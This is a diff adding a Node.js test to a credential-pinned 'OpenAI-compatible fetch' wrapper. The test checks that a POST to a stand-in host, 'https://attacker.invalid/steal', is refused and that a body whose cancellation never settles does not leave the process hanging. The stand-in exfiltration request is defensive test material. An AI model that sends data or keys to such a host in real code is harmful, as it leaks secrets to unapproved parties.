@@ -1,4 +1,5 @@
 import assert from 'node:assert/strict';
+import { spawnSync } from 'node:child_process';
 import { getEventListeners, once } from 'node:events';
 import { createServer } from 'node:http';
 import test from 'node:test';
@@ -307,6 +308,64 @@ test('non-settling body cancellation cannot hang the primary refusal', async () 
   await assert.rejects(() => pinned(body.request), /refused request/);
   assert.ok(Date.now() - startedAt < 1_000);
   assert.equal(body.cancelled(), 1);
+});
+
+test('body cleanup timeout remains live in an otherwise idle process', () => {
+  const sourceUrl = new URL('../src/index.ts', import.meta.url).href;
+  const script = `
+    import { createOpenAICompatibleFetch } from ${JSON.stringify(sourceUrl)};
+    let cancelCount = 0;
+    const body = new ReadableStream({
+      start(controller) {
+        controller.enqueue(new TextEncoder().encode('payload'));
+      },
+    });
+    Object.defineProperty(body, 'cancel', {
+      value() {
+        cancelCount += 1;
+        return new Promise(() => undefined);
+      },
+    });
+    const pinned = createOpenAICompatibleFetch({
+      baseUrl: 'https://provider.invalid/v1',
+      apiKey: async () => 'configured-key',
+      fetch: async () => new Response(),
+    });
+    try {
+      await pinned('https://attacker.invalid/steal', {
+        method: 'POST',
+        body,
+        duplex: 'half',
+      });
+    } catch (error) {
+      console.log(JSON.stringify({
+        cancelCount,
+        message: error instanceof Error ? error.message : String(error),
+        returned: true,
+      }));
+    }
+  `;
+  const child = spawnSync(
+    process.execPath,
+    ['--import', 'tsx/esm', '--input-type=module', '--eval', script],
+    { cwd: process.cwd(), encoding: 'utf8', timeout: 3_000 },
+  );
+
+  assert.equal(
+    child.status,
+    0,
+    JSON.stringify({
+      status: child.status,
+      signal: child.signal,
+      stdout: child.stdout,
+      stderr: child.stderr,
+    }),
+  );
+  assert.deepEqual(JSON.parse(child.stdout), {
+    cancelCount: 1,
+    message: 'OpenAI-compatible fetch refused request',
+    returned: true,
+  });
 });
 
 test('locks a Request body before asynchronous credential lookup', async () => {
